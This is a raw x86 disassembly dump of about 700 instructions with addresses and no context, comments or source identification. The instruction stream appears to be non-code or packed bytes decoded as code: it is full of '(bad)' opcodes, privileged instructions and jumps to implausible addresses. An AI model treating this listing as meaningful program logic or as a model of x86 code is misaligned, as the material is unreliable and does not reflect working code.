  42b869:	cmp    edx,DWORD PTR [ebx+0x75]
  42b86c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  42b872:	add    BYTE PTR [ebx],dh
  42b874:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  42b87a:	add    BYTE PTR [ebx+esi*1+0x4f64bb3c],cl
  42b881:	mov    ebx,0x3b3b00
  42b886:	jne    0x42b8b3
  42b888:	mov    DWORD PTR [ebx+0x728afc],edi
  42b88e:	xor    esi,DWORD PTR [ebx]
  42b890:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  42b896:	push   edi
  42b897:	cmp    esp,ebp
  42b899:	jne    0x42b89b
  42b89b:	sbb    DWORD PTR [eax],0x8085c3fc
  42b8a1:	clc    
  42b8a2:	dec    ecx
  42b8a3:	pop    ebx
  42b8a4:	sti    
  42b8a5:	add    eax,0xeb8bc075
  42b8aa:	cld    
  42b8ab:	xor    edi,DWORD PTR ds:0xf8c3855e
  42b8b1:	mov    ecx,DWORD PTR [ecx+edx*2]
  42b8b4:	rol    DWORD PTR [ebp-0x37],0xf
  42b8b8:	mov    DWORD PTR [eax],ecx
  42b8ba:	inc    edi
  42b8bb:	(bad)  
  42b8bc:	in     eax,0xf8
  42b8be:	add    bh,bh
  42b8c0:	(bad)  
  42b8c1:	mov    esi,0xc38a5e
  42b8c6:	mov    esi,DWORD PTR [ebx]
  42b8c8:	push   ecx
  42b8c9:	mov    edi,0xfc4ec7
  42b8ce:	test   DWORD PTR [ebp-0x8],edx
  42b8d1:	xor    ax,0x9cc7
  42b8d5:	sub    ebp,eax
  42b8d7:	inc    ebp
  42b8d8:	(bad)  
  42b8d9:	sub    edi,edi
  42b8db:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  42b8e1:	inc    ebp
  42b8e2:	add    BYTE PTR [esi+0x2b],ah
  42b8e5:	or     bh,BYTE PTR [edx+0xf8ac2]
  42b8eb:	cmp    al,0x33
  42b8ed:	mov    edi,DWORD PTR [edx+0xf84e81]
  42b8f3:	(bad)  
  42b8f4:	cmp    esi,DWORD PTR [ebx]
  42b8f6:	je     0x42b8b0
  42b8f8:	push   ebx
  42b8f9:	dec    esi
  42b8fa:	str    ecx
  42b8fd:	cmp    esp,DWORD PTR [edx+0x75]
  42b900:	int    0x33
  42b902:	mov    edi,0x789085f
  42b907:	mov    esp,DWORD PTR [esp+edi*8+0x0]
  42b90b:	leave  
  42b90c:	data16 add al,0xcb
  42b90f:	push   ebp
  42b910:	add    ebp,esp
  42b912:	jne    0x42b900
  42b914:	(bad)  
  42b915:	mov    DWORD PTR [ecx],0xd685f7ec
  42b91b:	clc    
  42b91c:	xlat   BYTE PTR ds:[ebx]
  42b91d:	inc    ebp
  42b91e:	mov    esi,DWORD PTR [eax+edx*2]
  42b921:	pushf  
  42b922:	in     eax,0x8b
  42b924:	add    ah,ch
  42b926:	or     BYTE PTR [edi+0x0],dl
  42b929:	push   ecx
  42b92a:	add    ax,0x72cb
  42b92e:	inc    edx
  42b92f:	add    BYTE PTR [eax],al
  42b931:	inc    ebp
  42b932:	data16 (bad) 
  42b934:	retf   
  42b935:	lock mov edx,0x66f80085
  42b93b:	inc    ebp
  42b93c:	retf   
  42b93d:	xor    eax,ecx
  42b93f:	pushf  
  42b940:	jge    0x42b909
  42b942:	ss cld 
  42b944:	pushf  
  42b945:	test   DWORD PTR [edi-0x8],ebx
  42b948:	je     0x42b98f
  42b94a:	xor    esi,DWORD PTR ds:0x7020840
  42b950:	ror    BYTE PTR [ebp-0x37],0x8d
  42b954:	push   ebp
  42b955:	add    esp,ebp
  42b957:	jb     0x42b8e4
  42b959:	add    BYTE PTR [eax],cl
  42b95b:	dec    ebp
  42b95c:	mov    bh,0x81
  42b95e:	push   esi
  42b95f:	push   edi
  42b960:	adc    DWORD PTR [ecx-0x3c],0x429eff81
  42b967:	xor    al,BYTE PTR [eax]
  42b969:	mov    edx,DWORD PTR [edi+0x10]
  42b96c:	(bad)  
  42b96d:	scas   eax,DWORD PTR es:[edi]
  42b96e:	mov    edx,0x890f003b
  42b973:	in     eax,dx
  42b974:	cld    
  42b975:	add    BYTE PTR [ebx],bh
  42b977:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  42b97b:	dec    ebp
  42b97c:	or     BYTE PTR [ebx],ch
  42b97e:	ret    0x458b
  42b981:	lock jmp 0x42b975
  42b984:	mov    ecx,DWORD PTR [eax]
  42b986:	or     BYTE PTR [edi],al
  42b988:	mov    ecx,eax
  42b98a:	xor    DWORD PTR [edx+0x2],0x0
  42b98e:	mov    bh,0xc1
  42b990:	adc    BYTE PTR [eax],dh
  42b992:	iret   
  42b993:	inc    ebp
  42b994:	mov    DWORD PTR [ebx],0x4dfff8c4
  42b99a:	inc    BYTE PTR [ebx]
  42b99c:	mov    edx,0x661100f8
  42b9a1:	adc    al,bh
  42b9a3:	dec    ecx
  42b9a4:	fisttp WORD PTR [ecx+0x456604c0]
  42b9aa:	add    dh,BYTE PTR ds:0x75e0845
  42b9b0:	ret    0x4d
  42b9b3:	lea    ecx,[ebx+0x18728301]
  42b9b9:	add    BYTE PTR [ebp+0x45],al
  42b9bc:	xor    eax,0xc7009ce9
  42b9c1:	add    al,ch
  42b9c3:	inc    ebp
  42b9c4:	test   DWORD PTR [ebx-0x3eba0708],ecx
  42b9ca:	xor    eax,0x781084d
  42b9cf:	push   edi
  42b9d0:	sahf   
  42b9d1:	push   ecx
  42b9d2:	xor    al,BYTE PTR [ecx+0x32f89e89]
  42b9d8:	inc    ebp
  42b9d9:	cmp    edi,DWORD PTR ds:0xc78b9c76
  42b9df:	or     ah,dh
  42b9e1:	inc    ebp
  42b9e2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  42b9e8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  42b9ee:	in     al,dx
  42b9ef:	hlt    
  42b9f0:	push   edi
  42b9f1:	push   edi
  42b9f2:	push   ecx
  42b9f3:	push   ecx
  42b9f4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  42b9fa:	sahf   
  42b9fb:	sahf   
  42b9fc:	xor    dh,BYTE PTR [edx]
  42b9fe:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  42ba04:	or     BYTE PTR [ebp+0x7],al
  42ba07:	mov    eax,ecx
  42ba09:	clc    
  42ba0a:	jb     0x42b9cd
  42ba0c:	add    BYTE PTR [ebp+0x55],cl
  42ba0f:	or     DWORD PTR [edi],0xc251d157
  42ba15:	add    DWORD PTR [ebx+0x32009e],0x8b76453b
  42ba1f:	mov    edi,eax
  42ba21:	or     cl,al
  42ba23:	inc    ebp
  42ba24:	dec    ebp
  42ba25:	mov    eax,DWORD PTR [ecx+0x514d570c]
  42ba2b:	or     WORD PTR [ecx],0x899e
  42ba30:	xor    cl,BYTE PTR [ebx+0x5776fc3b]
  42ba36:	mov    edx,DWORD PTR [ecx+0x8]
  42ba39:	mov    eax,DWORD PTR [ebp-0x8]
  42ba3c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb262]
  42ba43:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  42ba49:	inc    ebp
  42ba4a:	dec    eax
  42ba4b:	add    ecx,DWORD PTR [ebx+0x574df0f8]
  42ba51:	add    edx,DWORD PTR [ecx-0x8]
  42ba54:	mov    ecx,DWORD PTR [ecx]
  42ba56:	clc    
  42ba57:	or     BYTE PTR [ebp+eax*2+0x4532409e],al
  42ba5e:	mov    ecx,ebp
  42ba60:	clc    
  42ba61:	(bad)  
  42ba62:	popf   
  42ba63:	inc    DWORD PTR [eax]
  42ba65:	ret    0x8b
  42ba68:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  42ba6e:	mov    edi,esp
  42ba70:	hlt    
  42ba71:	test   ecx,esi
  42ba73:	clc    
  42ba74:	or     BYTE PTR [ebp+0x7],al
  42ba77:	xor    al,0xc1
  42ba79:	pushf  
  42ba7a:	jb     0x42baaf
  42ba7c:	add    BYTE PTR [eax-0x3f],al
  42ba7f:	inc    eax
  42ba80:	daa    
  42ba81:	inc    ebp
  42ba82:	inc    ebp
  42ba83:	xor    eax,0x7f80803
  42ba88:	dec    ebp
  42ba89:	sahf   
  42ba8a:	add    esi,DWORD PTR [edx]
  42ba8c:	clc    
  42ba8d:	cmp    DWORD PTR [ecx],ecx
  42ba8f:	or     al,0x8
  42ba91:	add    al,BYTE PTR [ebp+0x2c]
  42ba94:	xor    eax,0x7350845
  42ba99:	or     BYTE PTR [ebp+0x7],cl
  42ba9c:	lea    ebx,[esi-0x748dcdff]
  42baa2:	add    BYTE PTR [eax*2-0x74b21438],cl
  42baa9:	mov    edx,DWORD PTR [eax]
  42baab:	cld    
  42baac:	dec    ebp
  42baad:	push   edi
  42baae:	sub    edx,DWORD PTR [ecx-0x75]
  42bab1:	add    eax,0xf172fc
  42bab6:	or     BYTE PTR [ebp+0x7],cl
  42bab9:	add    eax,ecx
  42babb:	or     al,0x72
  42babd:	add    DWORD PTR [eax],eax
  42babf:	mov    ebx,0x29c2c1
  42bac4:	inc    ebp
  42bac5:	mov    eax,DWORD PTR [ebx]
  42bac7:	cmp    eax,0x3004d1c
  42bacd:	xbegin 0x66c846c7
  42bad3:	clc    
  42bad4:	or     BYTE PTR [ebp+0x45],al
  42bad7:	xor    al,0x35
  42bad9:	pushf  
  42bada:	or     BYTE PTR [ebx+0x454d1007],cl
  42bae0:	lea    eax,[ebp+0x33727501]
  42bae6:	add    cl,ch
  42bae8:	inc    ebp
  42bae9:	add    bl,ch
  42baeb:	add    BYTE PTR [ebx+0x45850845],cl
  42baf1:	je     0x42ba7e
  42baf3:	push   ebx
  42baf4:	or     al,0x85
  42baf6:	dec    ebp
  42baf7:	std    
  42baf8:	mov    bh,bh
  42bafa:	mov    BYTE PTR [ebp-0x75],al
  42bafd:	mov    edi,eax
  42baff:	or     al,0x89
  42bb01:	inc    ebp
  42bb02:	clc    
  42bb03:	mov    esp,esp
  42bb05:	hlt    
  42bb06:	call   DWORD PTR [edi-0x37]
  42bb09:	push   edi
  42bb0a:	or     al,0x51
  42bb0c:	push   ebp
  42bb0d:	xor    ebp,esp
  42bb0f:	mov    esi,0x457251
  42bb14:	xor    eax,0xc7459cc6
  42bb19:	mov    edi,eax
  42bb1b:	or     al,0x85
  42bb1d:	add    al,bh
  42bb1f:	inc    eax
  42bb21:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  42bb25:	or     ah,bh
  42bb27:	inc    eax
  42bb28:	push   edi
  42bb29:	jmp    0x42bb7c
  42bb2b:	mov    eax,DWORD PTR ds:0xe8720c
  42bb31:	mov    DWORD PTR [ebp-0x8],eax
  42bb34:	jne    0x42bb7b
  42bb36:	jmp    0x42bac3
  42bb38:	mov    ebp,DWORD PTR [eax]
  42bb3a:	clc    
  42bb3b:	retf   0xff57
  42bb3e:	push   ecx
  42bb3f:	mov    DWORD PTR ds:0x757210,eax
  42bb45:	mov    ecx,DWORD PTR [ebp-0x4]
  42bb48:	sub    esp,DWORD PTR [ebx-0x77]
  42bb4b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  42bb52:	or     ah,bh
  42bb54:	pop    es
  42bb55:	ds sahf 
  42bb57:	push   DWORD PTR [edx]
  42bb59:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  42bb5f:	(bad)  
  42bb60:	mov    bh,bh
  42bb62:	jmp    0x42bb50
  42bb64:	leave  
  42bb65:	jne    0x42bb6f
  42bb67:	call   0x2fb4c1
  42bb6c:	in     al,dx
  42bb6d:	dec    ebp
  42bb6e:	add    dh,BYTE PTR [ebx]
  42bb70:	add    BYTE PTR [ebx],al
  42bb72:	inc    ebp
  42bb73:	cmp    esi,DWORD PTR ds:0xc78b9c74
  42bb79:	or     al,0xf0
  42bb7b:	add    BYTE PTR [ebp+0x458bf845],al
  42bb81:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  42bb87:	adc    al,0x7
  42bb89:	enter  0x9fc0,0xa5
  42bb8d:	rol    BYTE PTR [eax],0x5e
  42bb90:	mov    ecx,ecx
  42bb92:	or     al,0xc
  42bb94:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  42bb9b:	jmp    0x42bb9c
  42bb9d:	push   ebp
  42bb9e:	mov    esp,ebp
  42bba0:	cld    
  42bba1:	inc    ebp
  42bba2:	inc    ebp
  42bba3:	or     DWORD PTR [ecx+0x457dec10],0x0
  42bbaa:	push   esi
  42bbab:	push   esi
  42bbac:	mov    edi,0x7af080f
  42bbb1:	add    bh,al
  42bbb3:	test   DWORD PTR [esi+0x3a7320f],ebx
  42bbb9:	add    BYTE PTR [ecx+0x4540100f],cl
  42bbbf:	mov    ebp,eax
  42bbc1:	mov    ebp,edi
  42bbc3:	lock call edx
  42bbc6:	fcom   DWORD PTR [ebp+0x45]
  42bbc9:	mov    eax,0x148a8b
  42bbce:	push   ecx
  42bbcf:	enter  0xc145,0x83
  42bbd3:	cmp    ecx,DWORD PTR [eax]
  42bbd5:	add    BYTE PTR [ebp+0x4d],al
  42bbd8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  42bbde:	call   0xffa2b74d
  42bbe3:	cmp    eax,DWORD PTR [ebp-0xc]
  42bbe6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  42bbea:	push   ebp
  42bbeb:	(bad)  
  42bbec:	call   0x33b9f0
  42bbf1:	mov    bh,0xdb
  42bbf3:	cld    
  42bbf4:	or     BYTE PTR [ebp+0x45],bl
  42bbf7:	(bad)  
  42bbf8:	call   0xff7cb888
  42bbfd:	add    al,BYTE PTR [ebp+0x37]
  42bc00:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  42bc06:	jne    0x42bc08
  42bc08:	(bad)  
  42bc09:	cmp    edi,esp
  42bc0b:	jne    0x42bc3e
  42bc0d:	mov    edi,edi
  42bc0f:	or     BYTE PTR [ebx-0x307f0b49],cl
  42bc15:	pop    ds
  42bc16:	into   
  42bc17:	je     0x42bbda
  42bc19:	mov    ebx,DWORD PTR [esi]
  42bc1b:	or     BYTE PTR [ebp-0x49],al
  42bc1e:	mov    esp,DWORD PTR [esi-0x77]
  42bc21:	mov    esi,0x8451f0c
  42bc26:	mov    eax,DWORD PTR [eax]
  42bc28:	or     al,0x66
  42bc2a:	sar    bl,0x3b
  42bc2d:	xor    esi,DWORD PTR [ebp+0x66]
  42bc30:	xor    ecx,edi
  42bc32:	pop    edi
  42bc33:	adc    bl,BYTE PTR [ebx+0x7c]
  42bc36:	ret    0xff
  42bc39:	cld    
  42bc3a:	inc    ebp
  42bc3b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  42bc41:	cld    
  42bc42:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  42bc49:	push   0xffffff83
  42bc4b:	pop    edi
  42bc4c:	or     BYTE PTR [ebp+0x53],dh
  42bc4f:	xorps  xmm1,xmm2
  42bc52:	test   BYTE PTR [eax+eax*1],bh
  42bc55:	add    BYTE PTR [eax],al
  42bc57:	adc    eax,eax
  42bc59:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  42bc61:	jmp    DWORD PTR [eax]
  42bc63:	ror    al,0x5e
  42bc66:	inc    ebp
  42bc67:	leave  
  42bc68:	xor    ecx,DWORD PTR [eax]
  42bc6a:	and    DWORD PTR [ebx-0x3ebd0708],ecx
  42bc70:	add    ah,al
  42bc72:	xor    edi,edi
  42bc74:	xor    DWORD PTR [ebx],0x66003308
  42bc7a:	mov    DWORD PTR [ebp-0xc],ecx
  42bc7d:	pcmpgtw mm0,mm0
  42bc80:	add    dl,ah
  42bc82:	leave  
  42bc83:	mov    edi,DWORD PTR [esi-0x7d]
  42bc86:	push   ax
  42bc88:	dec    ebp
  42bc89:	mov    esi,DWORD PTR [ebx-0x75]
  42bc8c:	lea    ebp,[eax-0x7c00ff08]
  42bc92:	xor    eax,DWORD PTR [eax]
  42bc94:	sysret 
  42bc96:	dec    ebp
  42bc97:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  42bc9e:	push   WORD PTR [ecx+0x8]
  42bca2:	jne    0x42bc65
  42bca4:	ud0    ecx,DWORD PTR [ecx]
  42bca7:	mov    edi,DWORD PTR [edx+0x660000ac]
  42bcad:	(bad)  
  42bcae:	iret   
  42bcaf:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  42bcb6:	cli    
  42bcb7:	inc    ebp
  42bcb8:	cmp    al,0x8d
  42bcba:	add    BYTE PTR [esi+0x2d],ah
  42bcbd:	inc    ebp
  42bcbe:	pop    ebp
  42bcbf:	lea    ecx,[edi]
  42bcc1:	mov    dl,bh
  42bcc3:	add    BYTE PTR [edi],cl
  42bcc5:	mov    DWORD PTR [eax+eax*8],edi
  42bcc8:	mov    ebx,0x3b87
  42bccd:	add    BYTE PTR [ebx],ch
  42bccf:	inc    ebp
  42bcd0:	data16 (bad) 
  42bcd2:	clc    
  42bcd3:	int3   
  42bcd4:	cmp    eax,DWORD PTR [eax]
  42bcd6:	je     0x42bc61
  42bcd8:	push   0xffffffc8
  42bcda:	pop    edi
  42bcdb:	xchg   DWORD PTR [ebp+0x0],eax
  42bcde:	data16 add BYTE PTR [ebp+0x45],cl
  42bce2:	lea    cx,[ebp+0x10]
  42bce6:	jb     0x42bce8
  42bce8:	jmp    0x42bc73
  42bcea:	call   eax
  42bcec:	clc    
  42bced:	xchg   DWORD PTR [edi+0x1],edi
  42bcf0:	mov    eax,DWORD PTR [eax]
  42bcf2:	or     BYTE PTR [ebp-0x49],al
  42bcf5:	lea    eax,[eax+0x74003154]
  42bcfb:	push   edi
  42bcfc:	inc    edx
  42bcfd:	jge    0x42bcfe
  42bcff:	mov    DWORD PTR [edi],ecx
  42bd01:	fdiv   DWORD PTR [edi-0x6]
  42bd04:	inc    DWORD PTR [eax]
  42bd06:	xor    edx,DWORD PTR [eax+0x5f]
  42bd09:	xchg   DWORD PTR [ebx+0x1],ebx
  42bd0c:	ret    0x0
  42bd0f:	xor    BYTE PTR [ebp-0x51],cl
  42bd12:	cmp    edi,0xf0ff89f8
  42bd18:	data16 ror al,0x84
  42bd1c:	rol    BYTE PTR [eax],0x3b
  42bd1f:	add    al,dh
  42bd21:	dec    eax
  42bd22:	xchg   esp,eax
  42bd23:	push   ebx
  42bd24:	jmp    0x42bcb1
  42bd26:	push   ebp
  42bd27:	add    esp,ebp
  42bd29:	add    ebp,esp
  42bd2b:	mov    edx,DWORD PTR [edi+0x24]
  42bd2e:	clc    
  42bd2f:	dec    esi
  42bd30:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  42bd36:	cmp    BYTE PTR [ebx],al
  42bd38:	jne    0x42bcc3
  42bd3a:	xor    esp,eax
  42bd3c:	jmp    0x45bebf
  42bd41:	add    ebp,DWORD PTR [ecx+ecx*4]
  42bd44:	jne    0x42bd3a
  42bd46:	call   0xffccbaa0
  42bd4b:	clc    
  42bd4c:	xchg   edi,eax
  42bd4d:	sti    
  42bd4e:	add    DWORD PTR [ebx],eax
  42bd50:	add    BYTE PTR [ebp+0x47],bl
  42bd53:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  42bd59:	pop    ebp
  42bd5a:	mov    DWORD PTR [esi-0x48],esi
  42bd5d:	jmp    0x42bda6
  42bd5f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  42bd65:	(bad)  
  42bd67:	cmp    al,0x0
  42bd69:	cmp    eax,DWORD PTR [ebp+0x18]
  42bd6c:	lea    ebx,[ebp-0x56]
  42bd6f:	jle    0x42bd71
  42bd71:	jae    0x42bcfc
  42bd73:	mov    eax,esp
  42bd75:	call   0xb900:0x8b005587
  42bd7c:	inc    ebp
  42bd7d:	push   ebp
  42bd7e:	lea    ecx,[ebp-0x27ff4f12]
  42bd84:	mov    eax,edi
  42bd86:	int3   
  42bd87:	push   ebp
  42bd88:	xchg   edi,eax
  42bd8a:	add    esp,ebp
  42bd8c:	add    BYTE PTR [eax],al
  42bd8e:	inc    ebp
  42bd8f:	add    BYTE PTR [ebp+0x8b3255],cl
  42bd95:	cld    
  42bd96:	mov    DWORD PTR [edx],edi
  42bd98:	aam    0x75
  42bd9a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  42bda0:	mov    DWORD PTR [ebx-0x50],edx
  42bda3:	test   BYTE PTR [ebp-0x1],0xe8
  42bda7:	mov    eax,DWORD PTR [eax]
  42bda9:	hlt    
  42bdaa:	add    al,al
  42bdac:	mov    eax,DWORD PTR ds:0x890045a8
  42bdb2:	dec    DWORD PTR [ebx+0x45fdf0e8]
  42bdb8:	inc    DWORD PTR [eax*2+0xf75854d]
  42bdbf:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  42bdc5:	call   0x72991b06
  42bdca:	je     0x42be2a
  42bdcc:	js     0x42be2d
  42bdce:	lock ret 0x7e
  42bdd2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  42bdd8:	mov    edi,edi
  42bdda:	sbb    al,bl
  42bddc:	clc    
  42bddd:	add    BYTE PTR [ebp-0x73],bh
  42bde0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  42bde6:	ror    BYTE PTR [eax],1
  42bde8:	dec    ebp
  42bde9:	xchg   ebp,eax
  42bdea:	mov    edi,edi
  42bdec:	in     al,0x8b
  42bdee:	jge    0x42bd79
  42bdf0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  42bdf6:	clc    
  42bdf7:	pop    esi
  42bdf8:	fist   DWORD PTR [ebp+0x5d398b5d]
  42bdfe:	clc    
  42bdff:	add    al,0x6e
  42be01:	mov    eax,DWORD PTR [ebx]
  42be03:	mov    BYTE PTR [ebp+0x0],dl
  42be06:	mov    edx,DWORD PTR [ebx-0x20]
  42be09:	adc    esi,DWORD PTR [edi+0x5e005f42]
  42be0f:	add    eax,0x3b3b73
  42be14:	adc    al,0x89
  42be16:	pop    eax
  42be17:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  42be1b:	ret    0xf08
  42be1e:	cmp    al,0x2
  42be20:	mov    DWORD PTR [edx+0x665500fc],edi
  42be26:	add    eax,ebx
  42be28:	add    esp,eax
  42be2a:	sub    eax,eax
  42be2c:	or     BYTE PTR [ecx-0x77f474bb],cl
  42be32:	add    BYTE PTR [eax],al
  42be34:	mov    DWORD PTR [ebx-0x24],ebx
  42be37:	push   edi
  42be38:	push   ebp
  42be39:	clc    
  42be3a:	add    DWORD PTR [esi+0x1b0100],0x45
  42be41:	out    0xff,eax
  42be43:	add    edx,DWORD PTR [eax]
  42be45:	jmp    0x42be2f
  42be47:	cmp    ch,0x49
  42be4a:	(bad)  
  42be4b:	jmp    0x40c8469d
  42be50:	je     0x42bddc
  42be52:	mov    eax,DWORD PTR [eax-0x10c78304]
  42be58:	inc    ebp
  42be59:	add    BYTE PTR [ebx-0x770375],al
  42be5f:	add    ah,ch
  42be61:	add    edx,esp
  42be63:	pop    edi
  42be64:	pop    ebp
  42be65:	push   ebp
  42be66:	inc    ebx
  42be67:	in     al,dx
  42be68:	pop    ebp
  42be69:	in     al,dx
  42be6a:	cmp    edx,DWORD PTR [edi-0x8]
  42be6d:	xor    eax,0x895b9c94
  42be72:	leave  
  42be73:	call   0x8998057c
  42be78:	in     al,dx
  42be79:	in     al,0x45
  42be7b:	dec    ebp
  42be7c:	push   esi
  42be7d:	test   DWORD PTR [eax+0xfb010f],esi
  42be83:	add    BYTE PTR [eax+0xc018b],dh
  42be89:	leave  
  42be8a:	inc    ebp
  42be8b:	test   al,ch
  42be8d:	add    dh,bh
  42be8f:	add    bh,bh
  42be91:	dec    ebp
  42be92:	push   cs
  42be93:	mov    DWORD PTR [ecx],eax
  42be95:	hlt    
  42be96:	push   es
  42be97:	dec    ebp
  42be98:	leave  
  42be99:	mov    DWORD PTR [eax],ecx
  42be9b:	clc    
  42be9c:	cmovge eax,ecx
  42be9f:	mov    ecx,0x85c2f0
  42bea5:	clc    
  42bea6:	pop    DWORD PTR [ebp+0x1]
  42bea9:	push   ebx
  42beaa:	add    BYTE PTR [ebp-0x15],bh
  42bead:	push   esi
  42beae:	xor    eax,0x898a45
  42beb3:	cld    
  42beb4:	or     BYTE PTR [ebp+0x0],al
  42beb7:	xor    esp,DWORD PTR [esi-0x64]
  42beba:	add    DWORD PTR [esi+0x78308c1],edi
  42bec0:	add    ah,BYTE PTR [edx-0x49]
  42bec3:	int    0xbb
  42bec5:	mov    ecx,DWORD PTR [esi+0xc]
  42bec8:	add    dh,al
  42beca:	cmp    ecx,ebx
  42becc:	jne    0x42be96
  42bece:	xor    ecx,DWORD PTR [ebp+0x66]
  42bed1:	jmp    0xc9bed7
  42bed6:	add    DWORD PTR [ebp+0x0],eax
  42bed9:	mov    eax,ebx
  42bedb:	or     al,0x8b
  42bedd:	(bad)  
  42bede:	mov    ecx,esi
  42bee0:	mov    BYTE PTR [eax+eax*1+0x664c13c],cl
  42bee7:	mov    eax,edi
  42bee9:	or     BYTE PTR [edx],cl
  42beeb:	shl    cl,cl
  42beed:	icebp  
  42beee:	add    BYTE PTR [ebp+0x35],0x8b
  42bef2:	or     BYTE PTR [edx+eax*2],cl
  42bef5:	(bad)  
  42bef6:	or     cl,dh
  42bef8:	stc    
  42bef9:	shl    DWORD PTR [ebp-0x30],0xc6
  42befd:	xor    al,0x0
  42beff:	inc    ebp
  42bf00:	xchg   BYTE PTR [ebx],al
  42bf02:	add    esp,edi
  42bf04:	add    BYTE PTR [ebp-0x39],cl
  42bf07:	mov    al,bl
  42bf09:	test   DWORD PTR [ebx+0x1c348375],ecx
  42bf0f:	sub    al,0xbf
  42bf11:	jmp    0x42be98
  42bf13:	mov    edi,eax
  42bf15:	lock jge 0x42bf09
  42bf18:	lea    esi,[edx-0x74bad501]
  42bf1e:	mov    ebp,esp
  42bf20:	or     cl,dh
  42bf22:	leave  
  42bf23:	add    al,BYTE PTR [eax+eax*4-0x37ff9e00]
  42bf2a:	dec    ebp
  42bf2b:	dec    ebp
  42bf2c:	test   DWORD PTR [ebx],eax
  42bf2e:	paddb  mm6,mm0
  42bf31:	add    DWORD PTR [eax],eax
  42bf33:	dec    ebp
  42bf34:	mov    ecx,DWORD PTR [ebx-0x61b217f0]
  42bf3a:	mov    esi,DWORD PTR [edx]
  42bf3c:	or     al,0x2b
  42bf3e:	dec    ebp
  42bf3f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  42bf45:	mov    esp,esp
  42bf47:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  42bf4e:	mov    DWORD PTR [ebx],ebp
  42bf50:	call   0xc764880
  42bf55:	mov    DWORD PTR [ebp+0x10],ecx
  42bf58:	(bad)  
  42bf59:	push   0x8b85ff10
  42bf5e:	clc    
  42bf5f:	or     al,0x57
  42bf61:	(bad)  
  42bf62:	push   ecx
  42bf63:	retf   
  42bf64:	mov    ebx,0xff4d8dc8
  42bf69:	mov    DWORD PTR [ebp+0x8],eax
  42bf6c:	xor    eax,DWORD PTR [ebp-0x75]
  42bf6f:	cmp    ebp,DWORD PTR [ebx]
  42bf71:	lsl    ebx,WORD PTR [edi-0x8]
  42bf75:	call   DWORD PTR [ebx-0x741bff75]
  42bf7b:	(bad)  
  42bf7c:	or     al,0x5b
  42bf7e:	dec    ebp
  42bf7f:	or     BYTE PTR [ebx],dh
  42bf81:	inc    ebp
  42bf82:	xor    esi,DWORD PTR ds:0x708088d
  42bf88:	in     eax,0x9e
  42bf8a:	add    BYTE PTR [edx],dh
  42bf8c:	inc    ebp
  42bf8d:	pop    edi
  42bf8e:	xor    eax,edx
  42bf90:	test   DWORD PTR [eax],0x83108b8b
  42bf96:	dec    ebp
  42bf97:	adc    al,0x33
  42bf99:	inc    ebp
  42bf9a:	xor    esi,DWORD PTR ds:0xc73b9c2b
  42bfa0:	jne    0x42bf9e
  42bfa2:	mov    eax,DWORD PTR [ebp+0x345f808]
  42bfa8:	mov    eax,DWORD PTR [ebp-0xc]
  42bfab:	mov    DWORD PTR [eax],0x685c9f4
  42bfb1:	clc    
  42bfb2:	dec    ecx
  42bfb3:	push   edi
  42bfb4:	xor    eax,0x4dd51745
  42bfb9:	xlat   BYTE PTR ds:[ebx]
  42bfba:	or     BYTE PTR [ebx+0x4d62fc57],0xd1
  42bfc1:	mov    eax,0x780084d
  42bfc6:	push   edi
  42bfc7:	clc    
  42bfc8:	ret    0xe99e
  42bfcb:	xor    dl,dl
  42bfcd:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  42bfd3:	js     0x8894bd2
  42bfd9:	dec    ebp
  42bfda:	push   ebp
  42bfdb:	mov    edi,DWORD PTR [eax+0xc872fc]
  42bfe1:	lock enter 0xceca,0xf2
  42bfe6:	retf   0x18ce
  42bfe9:	jne    0x42c038
  42bfeb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  42bff1:	enter  0xf0d6,0xca
  42bff5:	retf   0xf2c8
  42bff8:	into   
  42bff9:	out    dx,al
  42bffa:	dec    ebp
  42bffb:	dec    ebp
  42bffc:	jmp    0xff46bf34
  42c001:	xor    eax,DWORD PTR [ebp-0x15]
  42c004:	xor    esi,DWORD PTR [ebx]
  42c006:	mov    esi,DWORD PTR [ebx]
  42c008:	sub    eax,DWORD PTR [ebx]
  42c00a:	add    eax,DWORD PTR [ebx]
  42c00c:	or     bl,dl
  42c00e:	dec    ebp
  42c00f:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  42c015:	xor    eax,DWORD PTR [ebp-0xf00073]
  42c01b:	jb     0x42c062
  42c01d:	add    BYTE PTR [ebx],dh
  42c01f:	dec    ebp
  42c020:	pop    esi
  42c021:	mov    ebp,ebx
  42c023:	cld    
  42c024:	mov    esi,eax
  42c026:	call   0x521117f3
  42c02b:	stc    
